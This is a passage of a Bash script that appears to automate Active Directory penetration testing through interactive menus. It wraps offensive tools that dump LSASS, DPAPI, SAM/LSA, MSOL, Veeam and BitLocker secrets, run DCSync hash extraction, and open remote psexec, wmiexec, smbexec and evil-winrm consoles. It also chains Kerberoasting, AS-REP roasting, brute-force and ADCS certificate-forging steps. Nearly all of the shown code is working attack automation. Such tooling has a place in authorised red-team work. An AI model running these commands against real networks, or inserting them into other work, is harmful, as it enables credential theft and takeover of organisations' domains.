    else
        for i in $(/bin/cat "${curr_targets_list}"); do
            echo -e "${CYAN}[*] LSASS dump of ${i} using procdump ${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M procdump --log ${Credentials_dir}/lsass_dump_procdump_${user_var}_${i}.txt" 2>&1
        done
    fi
    echo -e ""
}

nanodump_dump() {
    echo -e "${BLUE}[*] Dumping LSASS using nanodump${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        for i in $(/bin/cat "${curr_targets_list}"); do
            echo -e "${CYAN}[*] LSASS dump of ${i} using nanodump ${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M nanodump --log ${Credentials_dir}/lsass_dump_nanodump_${user_var}_${i}.txt" 2>&1
        done
    fi
    echo -e ""
}

dpapi_dump() {
    echo -e "${BLUE}[*] Dumping DPAPI secrets using netexec${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] DPAPI dump requires credentials${NC}"
    else
        for i in $(/bin/cat "${curr_targets_list}"); do
            echo -e "${CYAN}[*] DPAPI dump of ${i} using netexec ${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --dpapi cookies --log ${Credentials_dir}/dpapi_dump_${user_var}_${i}.txt" 2>&1
        done
    fi
    echo -e ""
}

donpapi_dump() {
    if ! stat "${donpapi}" >/dev/null 2>&1; then
        echo -e "${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}"
    else
        echo -e "${BLUE}[*] Dumping secrets using DonPAPI${NC}"
        mkdir -p "${Credentials_dir}/DonPAPI_${user_var}/recover"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] DonPAPI requires credentials${NC}"
        else
            for i in $(/bin/cat "${curr_targets_list}"); do
                echo -e "${CYAN}[*] DonPAPI dump of ${i} ${NC}"
                run_command "${donpapi} -o ${Credentials_dir}/DonPAPI collect ${argument_donpapi} -t ${i} --dc-ip ${dc_ip}" | tee "${Credentials_dir}/DonPAPI_${user_var}/DonPAPI_${dc_domain}_${i}.txt"
            done
        fi
    fi
    echo -e ""
}

donpapi_noreg_dump() {
    if ! stat "${donpapi}" >/dev/null 2>&1; then
        echo -e "${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}"
    else
        echo -e "${BLUE}[*] Dumping secrets using DonPAPI${NC}"
        mkdir -p "${Credentials_dir}/DonPAPI_${user_var}/recover"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] DonPAPI requires credentials${NC}"
        else
            for i in $(/bin/cat "${curr_targets_list}"); do
                echo -e "${CYAN}[*] DonPAPI dump of ${i} ${NC}"
                run_command "${donpapi} -o ${Credentials_dir}/DonPAPI collect ${argument_donpapi} -nr -t ${i} --dc-ip ${dc_ip}" | tee "${Credentials_dir}/DonPAPI_${user_var}/DonPAPI_nr_${dc_domain}_${i}.txt"
            done
        fi
    fi
    echo -e ""
}

hekatomb_dump() {
    if ! stat "${hekatomb}" >/dev/null 2>&1; then
        echo -e "${RED}[-] hekatomb.py not found! Please verify the installation of HEKATOMB${NC}"
    else
        echo -e "${BLUE}[*] Dumping secrets using hekatomb${NC}"
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] hekatomb requires credentials and does not support Kerberos authentication${NC}"
        else
            current_dir=$(pwd)
            cd "${Credentials_dir}" || exit
            run_command "${hekatomb} ${argument_hekatomb}\\@${dc_ip} -dns ${dns_ip} -smb2 -csv" | tee "${Credentials_dir}/hekatomb_${user_var}.txt"
            cd "${current_dir}" || exit
        fi
    fi
    echo -e ""
}

bitlocker_dump() {
    if ! stat "${ExtractBitlockerKeys}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of ExtractBitlockerKeys${NC}"
    else
        echo -e "${BLUE}[*] Extracting BitLocker keys using ExtractBitlockerKeys${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] ExtractBitlockerKeys requires credentials ${NC}"
        else
            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v"; else verbose_p0dalirius=""; fi
            run_command "${python3} ${ExtractBitlockerKeys} ${argument_p0dalirius} ${ldaps_param} ${verbose_p0dalirius} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip}" 2>&1 | tee "${Credentials_dir}/bitlockerdump_${user_var}_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

winrm_dump() {
    echo -e "${BLUE}[*] Dumping LSA SAM credentials (winrm) ${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] LSA SAM dump requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Please specify IP or hostname of WinRM server:${NC}"
        echo -e "${CYAN}[*] Example: 10.1.0.5 or DC01 or DC01.domain.com ${NC}"
        target_winrm=""
        read -rp ">> " target_winrm </dev/tty
        while [ "${target_winrm}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " target_winrm </dev/tty
        done
            run_command "${netexec} ${ne_verbose} winrm ${target_winrm} ${argument_ne} --sam --log ${Credentials_dir}/sam_reg_dump_${user_var}_${target_winrm}.txt" 2>&1
            run_command "${netexec} ${ne_verbose} winrm ${target_winrm} ${argument_ne} --lsa --log ${Credentials_dir}/lsa_reg_dump_${user_var}_${target_winrm}.txt" 2>&1
    fi
    echo -e ""
}

msol_dump() {
    echo -e "${BLUE}[*] MSOL password dump.${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] MSOL password dump requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Please specify IP or hostname of Azure AD-Connect server:${NC}"
        echo -e "${CYAN}[*] Example: 10.1.0.5 or ADConnect01 or ADConnect01.domain.com ${NC}"
        target_msol=""
        read -rp ">> " target_msol </dev/tty
        while [ "${target_msol}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " target_msol </dev/tty
        done
        run_command "${netexec} ${ne_verbose} smb ${target_msol} ${argument_ne} -M msol --log ${Credentials_dir}/msol_${user_var}_${target_msol}.txt" 2>&1
    fi
    echo -e ""
}

veeam_dump() {
    echo -e "${BLUE}[*] Veeam credentials dump.${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] Veeam credentials dump requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Please specify IP or hostname of Veeam server:${NC}"
        echo -e "${CYAN}[*] Example: 10.1.0.5 or VEEAM01 or VEEAM01.domain.com ${NC}"
        target_veeam=""
        read -rp ">> " target_veeam </dev/tty
        while [ "${target_veeam}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " target_veeam </dev/tty
        done
        run_command "${netexec} ${ne_verbose} smb ${target_veeam} ${argument_ne} -M veeam --log ${Credentials_dir}/veeam_${user_var}_${target_veeam}.txt" 2>&1
    fi
    echo -e ""
}

get_hash() {
    if ! stat "${impacket_secretsdump}" >/dev/null 2>&1; then
        echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
    else
        gethash_nt=""
        gethash_aes=""
        if ! stat "${Credentials_dir}/hash_${gethash_user}_${dc_domain}.txt" >/dev/null 2>&1; then
            echo -e "${BLUE}[*] Extracting NTLM hash and AES keys of ${gethash_user}${NC}"
            if [ "${nullsess_bool}" == true ]; then
                echo -e "${PURPLE}[-] DCSync requires credentials${NC}"
            else
                run_command "${impacket_secretsdump} ${argument_imp}\\@${target} -just-dc-user $(echo "${domain}" | cut -d "." -f 1)/${gethash_user}" | tee "${Credentials_dir}/hash_${gethash_user}_${dc_domain}.txt"
            fi
        else
            echo -e "${YELLOW}[i] Hash file of ${gethash_user} found, skipping... ${NC}"
        fi
        gethash_nt=$(grep "${gethash_user}" "${Credentials_dir}/hash_${gethash_user}_${dc_domain}.txt" | grep -v "aes\|des" | cut -d ":" -f 4)
        gethash_aes=$(grep "aes256" "${Credentials_dir}/hash_${gethash_user}_${dc_domain}.txt" | cut -d ":" -f 3)
    fi
    echo -e ""
}

###### cmd_exec: Open CMD Console
smbexec_console() {
    if ! stat "${impacket_smbexec}" >/dev/null 2>&1; then
        echo -e "${RED}[-] smbexec.py not found! Please verify the installation of impacket ${NC}"
    elif [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] smbexec requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
        echo -e "${CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com ${NC}"
        read -rp ">> " smbexec_target </dev/tty
        while [ "${smbexec_target}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " smbexec_target </dev/tty
        done
        echo -e "${BLUE}[*] Opening smbexec.py console on target: $smbexec_target ${NC}"
        run_command "${impacket_smbexec} ${argument_imp}\\@${smbexec_target}" 2>&1 | tee -a "${CommandExec_dir}/impacket_smbexec_output_${user_var}.txt"
    fi
    echo -e ""
}

wmiexec_console() {
    if ! stat "${impacket_wmiexec}" >/dev/null 2>&1; then
        echo -e "${RED}[-] wmiexec.py not found! Please verify the installation of impacket ${NC}"
    elif [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] wmiexec requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
        echo -e "${CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com ${NC}"
        read -rp ">> " wmiexec_target </dev/tty
        while [ "${wmiexec_target}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " wmiexec_target </dev/tty
        done
        echo -e "${BLUE}[*] Opening wmiexec.py console on target: $wmiexec_target ${NC}"
        run_command "${impacket_wmiexec} ${argument_imp}\\@${wmiexec_target}" 2>&1 | tee -a "${CommandExec_dir}/impacket_wmiexec_output_${user_var}.txt"
    fi
    echo -e ""
}

psexec_console() {
    if ! stat "${impacket_psexec}" >/dev/null 2>&1; then
        echo -e "${RED}[-] psexec.py not found! Please verify the installation of impacket ${NC}"
    elif [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] psexec requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
        echo -e "${CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com ${NC}"
        read -rp ">> " psexec_target </dev/tty
        while [ "${psexec_target}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " psexec_target </dev/tty
        done
        echo -e "${BLUE}[*] Opening psexec.py console on target: $psexec_target ${NC}"
        run_command "${impacket_psexec} ${argument_imp}\\@${psexec_target}" 2>&1 | tee -a "${CommandExec_dir}/impacket_psexec_output_${user_var}.txt"
    fi
    echo -e ""
}

evilwinrm_console() {
    if ! stat "${evilwinrm}" >/dev/null 2>&1; then
        echo -e "${RED}[-] evilwinrm not found! Please verify the installation of evilwinrm ${NC}"
    elif [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] evilwinrm requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
        echo -e "${CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com ${NC}"
        read -rp ">> " evilwinrm_target </dev/tty
        while [ "${evilwinrm_target}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " evilwinrm_target </dev/tty
        done
        echo -e "${BLUE}[*] Opening evilwinrm console on target: $evilwinrm_target ${NC}"
        run_command "${evilwinrm} -i ${evilwinrm_target} ${argument_evilwinrm}" 2>&1 | tee -a "${CommandExec_dir}/impacket_evilwinrm_output_${user_var}.txt"
    fi
    echo -e ""
}

# ------------------------------ Auto ------------------------------
ad_enum() {
    mkdir -p "${DomainRecon_dir}"
    if [ "${nullsess_bool}" == true ]; then
        ldapdomaindump_enum
        enum4linux_enum
        ne_smb_usersenum
        windapsearch_enum
    else
        bhdce_enum
        ldapdomaindump_enum
        enum4linux_enum
        ne_ldap_usersenum
        ne_ldap_enum
        ne_passpol
        deleg_enum
        bloodyad_all_enum
        bloodyad_write_enum
        windapsearch_enum
    fi
}

adcs_enum() {
    mkdir -p "${ADCS_dir}"
    if [ "${nullsess_bool}" == true ]; then
        ne_adcs_enum
    else
        ne_adcs_enum
        certi_py_enum
        certipy_enum
        certifried_check
    fi
}

sccm_enum()
{
    mkdir -p "${SCCM_dir}"
    if [ "${nullsess_bool}" == false ]; then
        ne_sccm
        sccmhunter_enum
    fi
}

gpo_enum() {
    mkdir -p "${GPO_dir}"
    if [ "${nullsess_bool}" == true ]; then
        ne_gpp
    else
        ne_gpp
        gpoparser_enum
    fi
}

bruteforce() {
    mkdir -p "${BruteForce_dir}"
    if [ "${nullsess_bool}" == true ]; then
        ridbrute_attack
        kerbrute_enum
        userpass_kerbrute_check
        ne_pre2k
        ne_timeroast
    else
        userpass_kerbrute_check
        ne_pre2k
        ne_timeroast
    fi
}

kerberos() {
    mkdir -p "${Kerberos_dir}"
    if [ "${nullsess_bool}" == true ]; then
        asrep_attack
        kerberoast_attack
        asreprc4_attack
        john_crack_asrep
        john_crack_kerberoast
    else
        asrep_attack
        kerberoast_attack
        john_crack_asrep
        john_crack_kerberoast
        nopac_check
        ms14-068_check
    fi
}

scan_shares() {
    mkdir -p "${Shares_dir}"
    ne_shares
    ne_spider
    finduncshar_scan
}

vuln_checks() {
    mkdir -p "${Vulnerabilities_dir}"
    print_check
    webdav_check
    coerceplus_check
    smb_checks
    ldapnightmare_check
    badsuccessor_check
}

mssql_checks() {
    mkdir -p "${MSSQL_dir}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${RED}MSSQL checks requires credentials.${NC}"
    else
        mssql_enum
        mssql_relay_check
    fi
}

pwd_dump() {
    mkdir -p "${Credentials_dir}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${RED}Password dump requires credentials.${NC}"
    else
        laps_dump
        gmsa_dump
        secrets_dump
        donpapi_noreg_dump
        juicycreds_dump
    fi
}

netscan_run() {
    mkdir -p "${Scans_dir}"
    ne_scan "smb"
    ne_scan "winrm"
    ne_scan "ssh"
    ne_scan "mssql"
    /bin/cat "${servers_list}" >> "${sql_ip_list}"
    nhd_scan
}

# ------------------------------ Menu ------------------------------
print_info() {
    if [ "${offline_bool}" == "true" ]; then
        echo -e "${RED}WARNING:${NC} Running in Offline mode, no interaction with target, using fake authentication data\n";
    elif [ "${noexec_bool}" == "true" ]; then
        echo -e "${RED}WARNING:${NC} Running in NoExec mode, only printing commands\n"
    fi
    echo -e "${YELLOW}[i]${NC} Target domain: ${YELLOW}${dc_domain}${NC}"
    echo -e "${YELLOW}[i]${NC} Domain Controller's FQDN: ${YELLOW}${dc_FQDN}${NC}"
    echo -e "${YELLOW}[i]${NC} Domain Controller's IP: ${YELLOW}${dc_ip}${NC}"
    echo -e "${YELLOW}[i]${NC} Domain Controller's ports: RPC ${dc_port_135}, SMB ${dc_port_445}, LDAP ${dc_port_389}, LDAPS ${dc_port_636}, KRB ${dc_port_88}, RDP ${dc_port_3389}, WinRM ${dc_port_5985}"
    echo -e "${YELLOW}[i]${NC} DNS Server's IP: ${YELLOW}${dns_ip}${NC}"
    echo -e "${YELLOW}[i]${NC} Output folder: ${YELLOW}${output_dir}${NC}"
    echo -e "${YELLOW}[i]${NC} User wordlist file: ${YELLOW}${user_wordlist}${NC}"
    echo -e "${YELLOW}[i]${NC} Password wordlist file: ${YELLOW}${pass_wordlist}${NC}"
    echo -e "${YELLOW}[i]${NC} Attacker's IP and Interface: ${YELLOW}${attacker_IP}${NC} (${YELLOW}${attacker_interface}${NC})"
    echo -e "${YELLOW}[i]${NC} List of servers: ${YELLOW}${servers_hostname_list}${NC}"
    echo -e "${YELLOW}[i]${NC} List of users: ${YELLOW}${users_list}${NC}"
    if [ "${ldap_signing_enforced}" == true ]; then ldap_signing_status="${RED}Enforced${NC}"; else ldap_signing_status="${GREEN}Not Enforced${NC}"; fi
    if [ "${ldap_channel_binding_enforced}" == true ]; then ldap_cb_status="${RED}Enforced${NC}"; else ldap_cb_status="${GREEN}Not Enforced${NC}"; fi
    echo -e "${YELLOW}[i]${NC} Parameters: LDAPPort=${YELLOW}${ldap_port}${NC}, LDAPS=${YELLOW}${ldaps_bool}${NC}, LDAPSign=${YELLOW}${ldapbindsign_bool}${NC}, ForceKerb=${YELLOW}${forcekerb_bool}${NC}, DNSTCP=${YELLOW}${dnstcp_bool}${NC}, UseIP=${YELLOW}${useip_bool}${NC}"
    echo -e "${YELLOW}[i]${NC} LDAP Security: Signing=${ldap_signing_status}, ChannelBinding=${ldap_cb_status}"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${curr_targets}${custom_servers}${custom_ip}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${curr_targets_list}")${NC}"
}

modify_target() {
    echo -e ""
    echo -e "${YELLOW}[Modify target(s)]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${curr_targets}${custom_servers}${custom_ip}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${curr_targets_list}")${NC}"
    echo -e "1) Domain Controllers"
    echo -e "2) All domain servers"
    echo -e "3) File containing list of servers"
    echo -e "4) IP/hostname or IP range"
    echo -e "back) Go back"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    1)
        curr_targets="Domain Controllers"
        curr_targets_list="${target_dc}"
        custom_servers=""
        custom_ip=""
        ;;

    2)
        curr_targets="All domain servers"
        curr_targets_list="${target_servers}"
        custom_servers=""
        custom_ip=""
        ;;

    3)
        curr_targets="File containing list of servers: "
        curr_targets_list="${custom_servers_list}"
        custom_servers=""
        custom_ip=""
        /bin/rm "${custom_servers_list}" 2>/dev/null
        /bin/rm "${Scans_dir}"/servers_custom_*_"${dc_domain}.txt" 2>/dev/null
        read -rp ">> " custom_servers </dev/tty
        /bin/cp "$custom_servers" "${custom_servers_list}" 2>/dev/null
        while [ ! -s "${custom_servers_list}" ]; do
            echo -e "${RED}Invalid servers list.${NC} Please specify file containing list of target servers:"
            read -rp ">> " custom_servers </dev/tty
            /bin/cp "$custom_servers" "${custom_servers_list}" 2>/dev/null
        done
        ;;

    4)
        curr_targets="IP or hostname: "
        curr_targets_list="${custom_servers_list}"
        custom_servers=""
        custom_ip=""
        /bin/rm "${custom_servers_list}" 2>/dev/null
        /bin/rm "${Scans_dir}"/servers_custom_*_"${dc_domain}.txt" 2>/dev/null
        read -rp ">> " custom_ip </dev/tty
        echo -n "$custom_ip" >"${custom_servers_list}" 2>/dev/null
        while [ ! -s "${custom_servers_list}" ]; do
            echo -e "${RED}Invalid IP/hostname or IP range.${NC} Please specify IP/hostname or IP range:"
            read -rp ">> " custom_ip </dev/tty
            echo -n "$custom_ip" >"${custom_servers_list}" 2>/dev/null
        done
        ;;

    back) ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        modify_target
        ;;
    esac
}

set_attackerIP() {
    echo -e "Please choose the attacker's IP. List of current machine's IPs:"
    attacker_IPlist=($(/usr/bin/hostname -I))
    for ip in "${attacker_IPlist[@]}"; do
        echo -e "${YELLOW}${ip}${NC}"
    done
    attacker_IP=""
    read -rp ">> " attacker_IP </dev/tty

    while [[ -z "${attacker_IP}" ]]; do
        if [[ -z "${attacker_IP}" ]]; then
            echo -e "${RED}Empty input.${NC}"
        fi
        if [[ -z "${attacker_IP}" ]]; then
            echo -e "${RED}Invalid IP.${NC} Please specify your attacker's IP."
            read -rp ">> " attacker_IP </dev/tty
        fi
    done
}

pkinit_auth() {
    if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
    current_dir=$(pwd)
    cd "${Credentials_dir}" || exit
    if [[ "${pfxpass}" == "" ]]; then
        run_command "${certipy} auth -pfx '${pfxcert}' -dc-ip ${dc_ip} -username '${user}' -domain ${domain} ${ldaps_param}" | tee "${Credentials_dir}/certipy_PKINIT_output_${user_var}.txt"
    else
        echo -e "${CYAN}[i]${NC} Certificate password is provided, generating new unprotected certificate using Certipy${NC}"
        run_command "${certipy} cert -export -pfx $(realpath "$pfxcert") -password $pfxpass -out '${user}_unprotected.pfx'" | tee "${Credentials_dir}/certipy_PKINIT_output_${user_var}.txt"
        run_command "${certipy} auth -pfx '${user}_unprotected.pfx' -dc-ip ${dc_ip} -username '${user}' -domain ${domain} ${ldaps_param}" | tee -a "${Credentials_dir}/certipy_PKINIT_output_${user_var}.txt"
    fi
    hash=$(grep "Got hash for" "${Credentials_dir}/certipy_PKINIT_output_${user_var}.txt" | cut -d ":" -f 2,3 | cut -d " " -f 2 | tr -d '[:space:]')
    if [[ ! -z "${hash}" ]]; then
        echo -e "${GREEN}[+] NTLM hash extracted:${NC} $hash"
    fi
    cd "${current_dir}" || exit
}

get_domain_sid() {
    sid_domain=$(grep -o "Domain SID.*" "${DomainRecon_dir}/ne_sid_output_${dc_domain}.txt" 2>/dev/null | head -n 1 | cut -d " " -f 3)
    if [[ ${sid_domain} == "" ]]; then
        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --get-sid | tee ${DomainRecon_dir}/ne_sid_output_${dc_domain}.txt" >/dev/null
        sid_domain=$(grep -o "Domain SID.*" "${DomainRecon_dir}/ne_sid_output_${dc_domain}.txt" 2>/dev/null | head -n 1 | cut -d " " -f 3)
    fi
    echo -e "${YELLOW}[i]${NC} SID of Domain: ${YELLOW}${sid_domain}${NC}"
}

ad_menu() {
    mkdir -p "${DomainRecon_dir}"
    echo -e ""
    echo -e "${CYAN}[AD Enum menu]${NC} Please choose from the following options:"
    echo -e "--------------------------------------------------------"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "A) ACTIVE DIRECTORY ENUMERATIONS #3-4-5-6-16"
    else
        echo -e "A) ACTIVE DIRECTORY ENUMERATIONS #1ce-3-4-5-6-7-8-9-10-16"
    fi
    echo -e "1) BloodHound Enumeration using all collection methods (Noisy!)"
    echo -e "2) BloodHound Enumeration using DCOnly"
    echo -e "1ce) BloodHoundCE Enumeration using all collection methods (Noisy!)"
    echo -e "2ce) BloodHoundCE Enumeration using DCOnly"
    echo -e "3) ldapdomaindump LDAP Enumeration"
    echo -e "4) enum4linux-ng LDAP-MS-RPC Enumeration"
    echo -e "5) MS-RPC Users Enumeration using netexec"
    echo -e "6) Password policy Enumeration using netexec"
    echo -e "7) LDAP Users Enumeration using netexec"
    echo -e "8) LDAP Enumeration using netexec (passnotreq, userdesc, maq, subnets, passpol)"
    echo -e "9) Delegation Enumeration using findDelegation and netexec"
    echo -e "10) bloodyAD All Enumeration"
    echo -e "11) bloodyAD write rights Enumeration"
    echo -e "12) bloodyAD query DNS server"
    echo -e "13) bloodyAD enumerate object"
    echo -e "14) SilentHound LDAP Enumeration"
    echo -e "15) ldeep LDAP Enumeration"
    echo -e "16) windapsearch LDAP Enumeration"
    echo -e "17) LDAP Wordlist Harvester"
    echo -e "18) LDAP Enumeration using LDAPPER"
    echo -e "19) Adalanche Enumeration"
    echo -e "20) Enumeration of RDWA servers"
    echo -e "21) Open p0dalirius' LDAP Console"
    echo -e "22) Open p0dalirius' LDAP Monitor"
    echo -e "23) Open garrettfoster13's ACED console"
    echo -e "24) Open LDAPPER custom options"
    echo -e "25) Run godap console"
    echo -e "26) Run ADCheck enumerations"
    echo -e "27) Run soapy enumerations"
    echo -e "28) Soaphound Enumeration using all collection methods (Noisy!)"
    echo -e "29) Soaphound Enumeration using ADWSOnly"
    echo -e "30) Run DACLSearch dump and cli"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        ad_enum
        ad_menu
        ;;

    1)
        bhd_enum
        ad_menu
        ;;

    2)
        bhd_enum_dconly
        ad_menu
        ;;

    1ce)
        bhdce_enum
        ad_menu
        ;;

    2ce)
        bhdce_enum_dconly
        ad_menu
        ;;

    3)
        ldapdomaindump_enum
        ad_menu
        ;;

    4)
        enum4linux_enum
        ad_menu
        ;;

    5)
        ne_smb_usersenum
        ad_menu
        ;;

    6)
        ne_passpol
        ad_menu
        ;;

    7)
        ne_ldap_usersenum
        ad_menu
        ;;

    8)
        ne_ldap_enum
        ad_menu
        ;;

    9)
        deleg_enum
        ad_menu
        ;;

    10)
        bloodyad_all_enum
        ad_menu
        ;;

    11)
        bloodyad_write_enum
        ad_menu
        ;;

    12)
        bloodyad_dnsquery
        ad_menu
        ;;

    13)
        bloodyad_enum_object
        ad_menu
        ;;

    14)
        silenthound_enum
        ad_menu
        ;;

    15)
        ldeep_enum
        ad_menu
        ;;

    16)
        windapsearch_enum
        ad_menu
        ;;

    17)
        ldapwordharv_enum
        ad_menu
        ;;

    18)
        ldapper_enum
        ad_menu
        ;;

    19)
        adalanche_enum
        ad_menu
        ;;

    20)
        rdwatool_enum
        ad_menu
        ;;

    21)
        ldap_console
        ad_menu
        ;;

    22)
        ldap_monitor
        ad_menu
        ;;

    23)
        aced_console
        ad_menu
        ;;

    24)
        ldapper_console
        ad_menu
        ;;

    25)
        godap_console
        ad_menu
        ;;

    26)
        adcheck_enum
        ad_menu
        ;;

    27)
        soapy_enum
        ad_menu
        ;;

    28)
        soaphd_enum
        ad_menu
        ;;

    29)
        soaphd_enum_dconly
        ad_menu
        ;;

    30)
        daclsearch_run
        ad_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        ad_menu
        ;;
    esac
}

adcs_menu() {
    mkdir -p "${ADCS_dir}"
    echo -e ""
    echo -e "${CYAN}[ADCS menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "A) ADCS ENUMERATIONS #1"
    else
        echo -e "A) ADCS ENUMERATIONS #1-2-3-4"
    fi
    echo -e "P) Print ADCS Exploitation Steps"
    echo -e "1) ADCS Enumeration using netexec"
    echo -e "2) certi.py ADCS Enumeration"
    echo -e "3) Certipy ADCS Enumeration"
    echo -e "4) Certifried check"
    echo -e "5) Certipy LDAP shell via Schannel (using Certificate Authentication)"
    echo -e "6) Certipy extract CA and forge Golden Certificate (requires admin rights on PKI server)"
    echo -e "7) Dump LSASS using masky"
    echo -e "8) Dump NTDS using certsync"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        adcs_enum
        adcs_menu
        ;;

    P)
        adcs_vuln_parse | tee "${ADCS_dir}/ADCS_exploitation_steps_${dc_domain}.txt"
        adcs_menu
        ;;

    1)
        ne_adcs_enum
        adcs_menu
        ;;

    2)
        certi_py_enum
        adcs_menu
        ;;

    3)
        certipy_enum
        adcs_menu
        ;;

    4)
        certifried_check
        adcs_menu
        ;;

    5)
        certipy_ldapshell
        adcs_menu
        ;;

    6)
        certipy_ca_dump
        adcs_menu
        ;;

    7)
        masky_dump
        adcs_menu
        ;;

    8)
        certsync_ntds_dump
        adcs_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        adcs_menu
        ;;
    esac
}

sccm_menu() {
    mkdir -p "${SCCM_dir}"
    echo -e ""
    echo -e "${CYAN}[SCCM menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------"
    echo -e "A) SCCM ENUMERATIONS #1,2"
    echo -e "1) SCCM Enumeration using netexec"
    echo -e "2) SCCM Enumeration using sccmhunter"
    echo -e "3) SCCM NAA credentials dump using sccmhunter"
    echo -e "4) SCCM Policies and Files dump using SCCMSecrets"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        sccm_enum
        sccm_menu
        ;;

    1)
        ne_sccm
        sccm_menu
        ;;

    2)
        sccmhunter_enum
        sccm_menu
        ;;

    3)
        sccmhunter_dump
        sccm_menu
        ;;

    4)
        sccmsecrets_dump
        sccm_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        sccm_menu
        ;;
    esac
}

gpo_menu() {
    mkdir -p "${GPO_dir}"
    echo -e ""
    echo -e "${CYAN}[GPO menu]${NC} Please choose from the following options:"
    echo -e "----------------------------------------------------"
    echo -e "A) GPO ENUMERATIONS #1,3"
    echo -e "1) GPP Enumeration using netexec"
    echo -e "2) GPO Enumeration using GPOwned"
    echo -e "3) GPOParser Enumeration"
    echo -e "4) GroupPolicyBackdoor Enumeration"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        gpo_enum
        gpo_menu
        ;;

    1)
        ne_gpp
        gpo_menu
        ;;

    2)
        GPOwned_enum
        gpo_menu
        ;;

    3)
        gpoparser_enum
        gpo_menu
        ;;

    4)
        gpb_enum
        gpo_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        gpo_menu
        ;;
    esac
}

bruteforce_menu() {
    mkdir -p "${BruteForce_dir}"
    echo -e ""
